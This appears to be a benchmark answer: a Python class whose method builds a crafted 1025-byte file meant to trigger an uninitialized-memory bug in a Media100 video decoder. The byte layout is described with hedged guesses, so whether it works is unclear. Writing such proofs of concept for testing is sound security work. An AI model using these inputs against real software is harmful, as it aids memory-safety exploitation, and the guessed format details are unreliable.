class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC to trigger uninitialized value in output buffer padding
        # Based on Media100 format structure that causes partial buffer fill
        poc = bytearray(1025)
        # Media100 header-like structure (simplified for trigger)
        poc[0:4] = b'M100'  # Magic or identifier
        poc[4:8] = b'\x00\x01\x00\x00'  # Version or flags
        poc[8:12] = (1024).to_bytes(4, 'little')  # Frame size or similar
        poc[12:20] = b'\x00' * 8  # Padding/timestamps
        # Partial frame data to cause incomplete output buffer init
        poc[20:100] = b'\xff' * 80  # Some JPEG-like markers
        poc[100:500] = b'\x00' * 400  # Empty frame data
        # Trigger point: short enough to leave padding uninitialized
        poc[500:] = b'\x00' * 525
        return bytes(poc)
